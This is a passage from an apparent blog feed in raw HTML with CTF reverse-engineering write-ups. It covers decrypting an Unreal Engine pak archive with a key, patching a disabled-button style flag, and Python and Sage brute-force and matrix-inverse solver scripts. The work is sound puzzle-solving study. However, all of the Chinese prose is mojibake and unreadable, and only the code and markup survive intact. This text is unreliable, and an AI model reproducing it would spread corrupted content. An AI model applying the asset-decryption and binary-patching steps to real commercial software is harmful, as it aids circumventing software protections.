 <span class="attr">"Name"</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"Guid"</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"Key"</span>: <span class="string">"uZFnisGm9AFdQ2hGBMRKm38+LAShgkbEMJOn8bv/arc="</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"SigningKey"</span>: <span class="literal">null</span>,</span><br><span class="line">  <span class="attr">"bEnablePakSigning"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"bEnablePakIndexEncryption"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"bEnablePakIniEncryption"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"bEnablePakUAssetEncryption"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"bEnablePakFullAssetEncryption"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"bDataCryptoRequired"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"SecondaryEncryptionKeys"</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ç”¨æŒ‡å®šæ ¼å¼çš„commandè§£å¯†ï¼š</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"D:<span class="symbol">\E</span>pic Games"<span class="symbol">\U</span>E_4.26<span class="symbol">\E</span>ngine<span class="symbol">\B</span>inaries<span class="symbol">\W</span>in64<span class="symbol">\U</span>nrealpak.exe FindFlag-WindowsNoEditor.pak -Extract C:<span class="symbol">\U</span>sers<span class="symbol">\1</span>1480<span class="symbol">\D</span>esktop<span class="symbol">\s</span>ss<span class="symbol">\ </span>-cryptokeys=C:<span class="symbol">\U</span>sers<span class="symbol">\1</span>1480<span class="symbol">\D</span>esktop<span class="symbol">\s</span>ss<span class="symbol">\c</span>rypto.json</span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬è§£å¯†æ¸¸æˆä¸­çš„æ•°æ®å°±æ˜¯å„ç§æ¨¡å‹ï¼Œflagä¹Ÿåº”è¯¥ä¹Ÿæ˜¯ä¸€ä¸ªç±»ä¼¼çš„æ¨¡å‹æ–‡ä»¶ï¼Œä½¿ç”¨umodelæ‰“æ–‡ä»¶<strong>flag.uasset</strong>ï¼Œå†è½¬åŒ–æˆpngä¿å­˜å°±å¥½äº†ã€‚</p><p><img src="/2021/01/26/DJBCTF/image-20210126160135944-1611648556272.png" alt="image-20210126160135944"></p><h3 id="anniu"><a href="#anniu" class="headerlink" title="anniu"></a>anniu</h3><p>å¼€å§‹å°±çŸ¥é“è¦è®©ç°è‰²æŒ‰é’®å¯ç”¨ï¼Œæ‰¾äº†enablewindowå‡½æ•°ï¼Œä½†æ˜¯ä¸è¡Œï¼Œç„¶åè¿™ä¸ªæ˜¯æ˜“è¯­è¨€å†™çš„ç¨‹åºå’Œä»¥å¾€åšçš„æœ‰ç‚¹ä¸ä¸€æ ·ã€‚ã€‚æ‰¾æŒ‰é’®äº‹ä»¶åˆæ²¡æ‰¾åˆ°ï¼Ÿã€‚ã€‚å¥‡æ€ªã€‚</p><p>æœ€åç›´æ¥ODä»å¼€å§‹è·Ÿè¸ªç¨‹åºåˆ›å»ºçª—å£çš„è¿‡ç¨‹ã€‚å…¶å®å°±æ˜¯å¾ˆå¤šä¸ªå­çª—å£å åŠ çš„ã€‚ä»åˆ›å»ºflagæŒ‰é’®çš„creatwindowsexæ‰¾åˆ°äº†ç«¯å€ªï¼Œæˆ‘æ‰çŸ¥é“å¯ä»¥åˆ›å»ºçª—å£çš„æ—¶å€™è®©æ§ä»¶ä¸å¯ç”¨ã€‚ã€‚</p><p>å…¶ä¸­çš„WS_DISABLEDä»VSæŸ¥åˆ°äº†æ˜¯0x08000000ï¼Œæ‰€ä»¥æˆ‘æŠŠæ•´ä¸ªå€¼æ”¹ä¸º0x44012F00å³å¯ã€‚</p><p><img src="/2021/01/26/DJBCTF/image-20210125115444155-1611648561584.png" alt="image-20210125115444155"></p><h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>å°±ä¸€ä¸ªæ•°ç‹¬æ¸¸æˆï¼Œå¼€å§‹åˆ¤æ–­æ˜¯ä¸æ˜¯æ¯åˆ—æ¯è¡Œçš„æ•°éƒ½å„ä¸ç›¸åŒï¼Œç„¶ååˆ¤æ–­æ¯4*4çš„å•å…ƒæ˜¯ä¸æ˜¯æ¯ä¸ªæ•°å„ä¸ç›¸åŒï¼Œå…¸å‹çš„æ•°ç‹¬ç‰¹å¾ã€‚</p><p>ç›´æ¥æ‰¾ä¸ªåœ¨çº¿æ±‚è§£ä¸€ä¸‹å³å¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> flag[] = &#123;<span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">9</span>, </span><br><span class="line"><span class="number">14</span>, <span class="number">16</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">2</span>,</span><br><span class="line"><span class="number">1</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">6</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(flag[i]<span class="number">-1</span> &gt;= <span class="number">10</span>)</span><br><span class="line"><span class="built_in">putchar</span>(flag[i]<span class="number">-1</span>+<span class="number">87</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">putchar</span>(flag[i]<span class="number">-1</span>+<span class="number">48</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="e"><a href="#e" class="headerlink" title="e"></a>e</h3><p>åº”è¯¥ç±»ä¼¼ä¸»ç¨‹åºè£…è½½ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åå…³é”®å‡½æ•°éƒ½åœ¨é‚£ä¸ª.soæ–‡ä»¶ï¼Œæ‰€ä»¥åŠ¨æ€è·Ÿè¸ªå°±å¥½äº†ï¼Œå¾ˆç®€å•ï¼Œæ‰¾åˆ°è¾“å…¥çš„åœ°æ–¹åä¸‹ä¸ªæ–­ç‚¹ï¼Œä¸€ä¼šå°±æ¥åˆ°çš„ä¸€ä¸ªæ¯”è¾ƒå‡½æ•°ï¼Œè™½ç„¶å»äº†ç¬¦å·ï¼Œä½†è¿˜æ˜¯èƒ½çŒœåˆ°å°±æ˜¯ç±»ä¼¼strcmp()å‡½æ•°ï¼Œè¾“å…¥å’Œç›®æ ‡å­—ç¬¦æ¯”è¾ƒã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ•´ä½“æ„Ÿè§‰Reæœ‰ç‚¹åæ‚ï¼Œæœ‰æ”¶è·ï¼Œä¸»è¦æ˜¯æ‹¿äº†ä¸ªæ¯å­ï¼Œhhaã€‚ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>starctf2021</title>
    <link href="https://www.bxnop.cn/2021/01/17/starctf2021/"/>
    <id>https://www.bxnop.cn/2021/01/17/starctf2021/</id>
    <published>2021-01-17T03:58:05.000Z</published>
    <updated>2021-02-16T11:19:17.827Z</updated>
    
    <content type="html"><![CDATA[<p>åšäº†3ä¸ªReï¼Œä»ä¸­æ„Ÿè§‰è‡ªå·±pythonè¿ç”¨èƒ½åŠ›ä¸è¡Œï¼Œå…¶æ¬¡å¯¹å¸¸è§çš„ä¸€äº›ç®—æ³•æ€§è´¨ä¸è¿‡å…³ï¼Œä¹‹å‰æŠŠz3æƒ³æˆä¸‡èƒ½çš„äº†ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªé¢˜å› ä¸ºz3æ‰¾ä¸åˆ°è§£æˆ‘å°±ä»¥ä¸ºæ— è§£ã€‚ã€‚å½“æ—¶å°±æƒ³ä¸é€šäº†ã€‚æœ€åå‘ç°å¤§å®¶é‚£ä¸ªé¢˜çˆ†ç ´æ¥åšçš„æ¯”è¾ƒå¤šã€‚ã€‚å…¶æ¬¡å°±æ˜¯åœ¨ä¸€ä¸ªæœ‰é™åŸŸæ±‚é€†çŸ©é˜µç„¶åç›¸ä¹˜å°±å¥½äº†ï¼Œä¹Ÿå°±æ˜¯hillåŠ å¯†ã€‚å¤§ä¸€è¿˜å­¦è¿‡çº¿æ€§ä»£æ•°çš„ã€‚ã€‚</p><p>ç„¶åå°±æ˜¯ä¸€ä¸ªé¢˜å†™ä¸€ä¸ªdfsè„šæœ¬èŠ±äº†å¾ˆå¤šæ—¶é—´ï¼Œå¯¹python3çš„è¯»å†™æ–‡ä»¶â€œwbâ€ä¸â€œwâ€æ¨¡å¼æ²¡æœ‰äº†è§£ï¼Œè¿™æ¬¡è¿ç”¨å°±æš´éœ²å‡ºäº†é—®é¢˜ã€‚ã€‚ä¸”è¿™åœ¨python2ä¸python3ä¸­ä¹Ÿæœ‰åŒºåˆ«ã€‚</p><p>æœ€åå¤šçº¿ç¨‹çˆ†ç ´ç¡®å®æ˜¯ä¸ªå¥½ä¸œè¥¿ã€‚æœç´¢ç®—æ³•è¦å¥½å¥½å­¦ã€‚ã€‚</p><p>é˜Ÿä¼29åï¼ŒåŠ æ²¹ã€‚<a id="more"></a></p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="stream"><a href="#stream" class="headerlink" title="stream"></a>stream</h3><p>å¼€å§‹å…³é”®ç‚¹éƒ½æ²¡æ‰¾åˆ°ï¼Œè¿è¡Œäº†ä¸€ä¸‹ç¨‹åºä»æŠ¥é”™ä¿¡æ¯ç»è¿‡æœç´¢çŸ¥é“äº†è¿™æ˜¯ä¸ªrustå†™ç¨‹åºï¼Œä¸”è¿™ä¸ªé”™è¯¯ä¿¡æ¯æ˜¯ç¼–å†™çš„æ—¶å€™å¯ä»¥å®šä¹‰çš„ï¼Œä»è¿™ä¹Ÿé¡ºè—¤æ‘¸ç“œçš„çŸ¥é“äº†æŠ¥é”™æ˜¯å› ä¸ºæ²¡æœ‰flagæ–‡ä»¶ã€‚</p><p>ç¨‹åºé¦–å…ˆè¯»å–flagæ–‡ä»¶å–æ•°æ®ï¼Œç»è¿‡åŠ å¯†åå†™å…¥outputæ–‡ä»¶ã€‚</p><p><img src="/2021/01/17/starctf2021/image-20210127134521754-1611759746138.png" alt="image-20210127134521754"></p><p>ç„¶åç®€å•åˆ†æä¸€ä¸‹ï¼Œé€»è¾‘ä»€ä¹ˆçš„å¾ˆæ¸…æ¥šï¼ŒæŒ‰ç…§ä¸€å®šçš„é¡ºåºå¯¹æ¯ä¸€ä½è¿›è¡Œå¼‚æˆ–åŠ å¯†ï¼Œä½†æ˜¯é‚£ä¸ªå¼‚æˆ–çš„å€¼æ˜¯éšæœºçš„ï¼Œé€šè¿‡å‰é¢çš„æ•°æ®æ¥åˆå§‹åŒ–çš„æ•°æ®æµã€‚æ˜¯ä¸€ç§æµå¯†ç ï¼Œä½†è¿™é‡Œæƒ³äº†å¾ˆä¹…ä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆé€†ï¼Œåé¢æƒ³åˆ°æŒ‰ç…§é¢˜ç›®åŠ å¯†çš„é¡ºåºä¸€ä½ä¸€ä½çš„ç©·ä¸¾è‚¯å®šå¯ä»¥ï¼Œï¼Œä½†æ˜¯å·¥ç¨‹é‡å°±æœ‰ç‚¹å¤§äº†ã€‚ã€‚</p><p>æœ€åæ‰æƒ³åˆ°äº†pythonè„šæœ¬ï¼ŒèŠ±äº†ç‚¹æ—¶é—´ï¼Œä¹Ÿæ”¹äº†å¾ˆå¤šï¼Œè¿˜æœ‰å°±æ˜¯è¿™ä¸ªå­˜åœ¨å¤šå¯¹ä¸€çš„æƒ…å†µï¼Œæ‰€ä»¥è¦æœç´¢ã€‚ã€‚</p><p>å…¶æ¬¡å¼€å§‹æ€ä¹ˆä¹Ÿè·‘ä¸å‡ºæ¥ï¼Œåé¢è°ƒè¯•æ‰å‘ç°ï¼Œç¨‹åºæ¯æ¬¡è¯»å–çš„å­—ç¬¦éƒ½åŠ äº†å›è½¦ï¼ˆâ€™\0xaâ€™ï¼‰ï¼Œè¿™å°±å¯¼è‡´é•¿åº¦å¢åŠ ï¼Œè€ŒåŠ å¯†æ˜¯ç”¨åˆ°äº†é•¿åº¦çš„ã€‚ã€‚ç„¶åå°±æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p><p>æœ€åå¤§é‡å°è¯•æœç´¢æ‰å‘ç°ï¼Œå› ä¸ºæˆ‘å¼€å§‹æ˜¯å¾€flagæ–‡ä»¶æ‰‹åŠ¨è¾“å…¥çš„ï¼Œç„¶åè„šæœ¬é‡Œä¹Ÿæ˜¯å…ˆè¯»å–flagæ–‡ä»¶ï¼Œè¿™å°±å¯¼è‡´å¼€å§‹å°±å¤šäº†å’Œä¸€ä¸ªâ€™\0xaâ€™ï¼Œè€Œååœ¨å†™å…¥ä¹Ÿæ˜¯åŒæ ·æœ‰â€˜\0xaâ€™ã€‚å…¶æ¬¡python2çš„â€˜rbâ€™ä¸â€˜râ€™æ¨¡å¼è¯»å–éƒ½æ˜¯strç±»å‹ï¼Œè€Œpython3çš„â€˜rbâ€™æ˜¯byte, â€˜râ€™æ‰æ˜¯strç±»å‹ã€‚ä¸”pythonè‹¥æ˜¯â€˜wbâ€™å†™å…¥é‚£å†™å…¥æ•°æ®å¿…é¡»æ˜¯byteç±»å‹ï¼Œè€Œpython2å°±éƒ½å¯ä»¥ã€‚</p><p>è¿™é‡Œæ‰§è¡Œç¨‹åºï¼Œæœ‰3ç§åŠæ³•ï¼š</p><ul><li>os.system(â€˜./aâ€™) è¿™é‡Œå»ºè®®ä½¿ç”¨è¿™ä¸ªã€‚</li><li>ä½¿ç”¨Popen() <a href="https://blog.csdn.net/super_he_pi/article/details/99713374" target="_blank" rel="noopener">python ä¸­subprocess.Popen(ï¼‰è¯¦è§£</a></li><li>pexpect å¦‚æœæœ‰äº¤äº’çš„è¯ï¼Œæ¨èä½¿ç”¨ã€‚</li></ul><p>10så°±å¾—åˆ°äº†ç»“æœï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> pexpect</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">startTime = datetime.datetime.now()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"output_flag"</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">enc = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">index = [<span class="number">4</span>, <span class="number">11</span>, <span class="number">18</span>, <span class="number">25</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">21</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">42</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">17</span>, <span class="number">24</span>, <span class="number">31</span>, <span class="number">38</span>, <span class="number">45</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">34</span>, <span class="number">41</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">44</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">19</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">40</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">22</span>, <span class="number">29</span>, <span class="number">36</span>, <span class="number">43</span>]</span><br><span class="line">base = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#123;&#125;_=-~!.@#%^&amp;*()"</span></span><br><span class="line">result = [<span class="string">'1'</span>]*<span class="number">46</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(i)</span>:</span></span><br><span class="line"><span class="keyword">if</span> i &gt; <span class="number">45</span>:</span><br><span class="line">print(<span class="string">'find one:'</span> + <span class="string">''</span>.join(result))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> base:</span><br><span class="line">result[index[i]] = ch</span><br><span class="line">flag = <span class="string">''</span>.join(result)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(flag.encode())</span><br><span class="line">f.close()</span><br><span class="line"><span class="comment">#r = pexpect.spawn('./a')</span></span><br><span class="line"><span class="comment">#r.wait()</span></span><br><span class="line">os.system(<span class="string">'./a'</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'output'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">ans = f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">if</span> ans[index[i]] == enc[index[i]]:</span><br><span class="line">    print(flag)</span><br><span class="line">    dfs(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">dfs(<span class="number">0</span>)</span><br><span class="line">endTime = datetime.datetime.now()</span><br><span class="line">print(<span class="string">"è¿è¡Œçš„æ—¶é—´æ˜¯ï¼š%ss"</span> % (endTime - startTime).seconds)</span><br></pre></td></tr></table></figure><h3 id="ChineseGame"><a href="#ChineseGame" class="headerlink" title="ChineseGame"></a>ChineseGame</h3><p>è¯»æ‡‚æ¸¸æˆæ€ä¹ˆç©çš„åï¼Œæ‰‹åŠ¨å¼„äº†å‡ ä¸ªæ•°æ®ç„¶åæ€»ç»“è§„å¾‹ã€‚</p><p>ä¸€ä¸ªé•¿åº¦ä¸º10çš„é“¾è¡¨ï¼Œæœ€åæŠŠæ‰€æœ‰çš„æ•°æ®åŸŸéƒ½å˜æˆå¤§äº100ã€‚</p><p><img src="/2021/01/17/starctf2021/image-20210127135918158-1611759760723.png" alt="image-20210127135918158"></p><p>å°±æ˜¯ä¸æ–­ç´¯åŠ å¥—ä¸Šå»å°±æ˜¯äº†ã€‚</p><p>èµ›åçœ‹å¤§å®¶å¾ˆå¤šéƒ½æ˜¯å‘ç°äº†åªè¦é‚£ä¸ªæ•°æ®åŸŸæ˜¯0å°±åƒå‘ä¸Šï¼Œ1çš„è¯å°±å‘ä¸‹ï¼Œç›´æ¥paythonè„šæœ¬ï¼ŒçœŸæ˜¯å¥½ã€‚ã€‚ã€‚</p><h3 id="wherekey"><a href="#wherekey" class="headerlink" title="wherekey"></a>wherekey</h3><p>å°±æ˜¯è¿™ä¸ªé¢˜å› ä¸ºz3æ²¡æœ‰è§£ï¼Œä»¥ä¸ºæˆ‘å“ªé‡Œå¼„é”™äº†éƒé—·åŠå¤©ï¼Œæœ€åä¹Ÿæ²¡æœ‰æŠŠé¢˜ç›®åšå‡ºæ¥ã€‚</p><p>ç”±çŸ©é˜µçš„ä¹˜æ³•å¯çŸ¥ï¼Œè¿™é‡Œç®—æ³•å®é™…å°±æ˜¯ç”¨ä¸€ä¸ªå›ºå®šçš„5*5çŸ©é˜µå»ä¹˜flagç»„æˆçš„5*5çŸ©é˜µï¼Œä½†æ˜¯æ¯æ¬¡éƒ½modäº†257ï¼Œæ‰€ä»¥åœ¨ä¸€ä¸ªæœ‰é™åŸŸå†…ã€‚</p><p>ç„¶åå…¶å®å¯ä»¥çˆ†ç ´çš„ï¼Œæˆ‘çœ‹çˆ†ç ´çš„äººä¹ŸæŒºå¤šçš„ï¼Œhhhaã€‚ã€‚</p><p>è¿™é‡Œæˆ‘ç®—äº†ä¸€ä¸‹ï¼Œå¦‚æœå¸¸è§„å†™5ä¸ªforå¾ªç¯çˆ†ç ´æ—¶é—´ä¸ä¼šå°‘çš„ã€‚ã€‚</p><p>ä½†æ˜¯ç”¨pwntoolsçš„å¤šçº¿ç¨‹çˆ†ç ´ï¼Œæœ€å¤š2ä¸ªå¤šå°æ—¶å°±æå®šäº†ï¼Œä¹Ÿè¿˜æ˜¯å¯ä»¥çš„ã€‚hhhã€‚<a href="https://happi0.gitee.io/happi0/2020/12/03/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84python/#toc-heading-3" target="_blank" rel="noopener">Cryptoå¸¸ç”¨å·¥å…·</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> pwnlib</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">base = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#123;&#125;_=-~!.@#%^&amp;*()"</span></span><br><span class="line">enc = [<span class="number">56</span>, <span class="number">109</span>,  <span class="number">75</span>,  <span class="number">75</span>, <span class="number">185</span>, <span class="number">138</span>, <span class="number">249</span>, <span class="number">138</span>, <span class="number">187</span>,  <span class="number">92</span>, </span><br><span class="line">  <span class="number">138</span>, <span class="number">154</span>, <span class="number">186</span>, <span class="number">107</span>, <span class="number">210</span>, <span class="number">198</span>, <span class="number">187</span>,   <span class="number">5</span>, <span class="number">144</span>,  <span class="number">86</span>, </span><br><span class="line">  <span class="number">147</span>, <span class="number">230</span>,  <span class="number">18</span>, <span class="number">189</span>,  <span class="number">79</span>]</span><br><span class="line">b = <span class="string">"flag&#123;are_you_sure_friend&#125;"</span></span><br><span class="line">b = list(map(ord, b))</span><br><span class="line">enc = enc[<span class="number">5</span>:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(a)</span>:</span></span><br><span class="line">a = list(map(ord, a))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line"><span class="comment">#a = list(map(ord, a)) å¾ˆæ— è„‘çš„é”™è¯¯ï¼Œä¸èƒ½æ”¾åœ¨è¿™é‡Œçš„åŸå› :å› ä¸ºå¦‚æœå·²ç»è½¬æ¢äº†ä¸€æ¬¡äº†ï¼Œé‚£å°±å·²ç»æ˜¯intå‹ï¼Œä¸‹ä¸€æ¬¡è½¬æ¢å°±å‡ºé”™äº†ã€‚</span></span><br><span class="line"><span class="keyword">if</span> ((a[<span class="number">0</span>]*b[i] + a[<span class="number">1</span>]*b[<span class="number">5</span>+i] + a[<span class="number">2</span>]*b[<span class="number">10</span>+i] + a[<span class="number">3</span>]*b[<span class="number">15</span>+i] + a[<span class="number">4</span>]*b[<span class="number">20</span>+i])%<span class="number">257</span>) != enc[i]:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">ans = mbruteforce(check, base, <span class="number">5</span>, method=<span class="string">'fixed'</span>)</span><br></pre></td></tr></table></figure><p>æœ€åè´´ä¸€ä¸‹å®˜æ–¹æ”¾çš„ä½¿ç”¨sageæ±‚è§£ï¼Œä¹Ÿå°±æ˜¯å¸¦ä½™çš„çŸ©é˜µä¹˜æ³•å’Œé€†çŸ©é˜µã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A = Matrix(GF(<span class="number">257</span>),[[<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>], [<span class="number">97</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">95</span>, <span class="number">121</span>], [<span class="number">111</span>, <span class="number">117</span>, <span class="number">95</span>, <span class="number">115</span>, <span class="number">117</span>], [<span class="number">114</span>, <span class="number">101</span>, <span class="number">95</span>, <span class="number">102</span>, <span class="number">114</span>], [<span class="number">105</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">125</span>]])</span><br><span class="line"></span><br><span class="line">encode =  Matrix(GF(<span class="number">257</span>),[[<span class="number">56</span>, <span class="number">109</span>, <span class="number">75</span>,<span class="number">75</span>,<span class="number">185</span>], [<span class="number">138</span> ,<span class="number">249</span>, <span class="number">138</span>, <span class="number">187</span>,  <span class="number">92</span>],[<span class="number">138</span>, <span class="number">154</span> ,<span class="number">186</span>, <span class="number">107</span>, <span class="number">210</span>],[<span class="number">198</span>, <span class="number">187</span>,   <span class="number">5</span>, <span class="number">144</span>,  <span class="number">86</span>],[<span class="number">147</span>, <span class="number">230</span>,  <span class="number">18</span>, <span class="number">189</span>,  <span class="number">79</span>]])</span><br><span class="line"></span><br><span class="line">flag = encode*A.inverse()</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ‰¾ä¸ªåœ¨çº¿ç½‘ç«™è§£ä¸€ä¸‹å°±å¥½ï¼š<a href="https://sagecell.sagemath.org/" target="_blank" rel="noopener">sageåœ¨çº¿æ±‚è§£</a></p><p><img src="/2021/01/17/starctf2021/image-20210127153009965-1611759765185.png" alt="image-20210127153009965"></p><h3 id="Favourite-Architecture-flag0"><a href="#Favourite-Architecture-flag0" class="headerlink" title="Favourite Architecture flag0"></a>Favourite Architecture flag0</h3><p>æœ‰ghidra9.2å°±å¾ˆç®€å•äº†ï¼ŒæŸ¥æŸ¥riscvç›¸å…³çš„æŒ‡ä»¤ï¼Œå®åœ¨ä¸å¥½ç†è§£çš„æ–¹å¼è°ƒè¯•ä¹Ÿè¡Œã€‚</p><p>å‰åŠæ®µæµåŠ å¯†ï¼Œåªè¦æœ€åå¾—åˆ°æœ€åçš„å¼‚æˆ–å€¼å°±å¥½äº†ã€‚ååŠæ®µä¸€ä¸ªteaåŠ å¯†ã€‚</p><p>è¿™é‡Œè´´ä¸‹teaå§ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 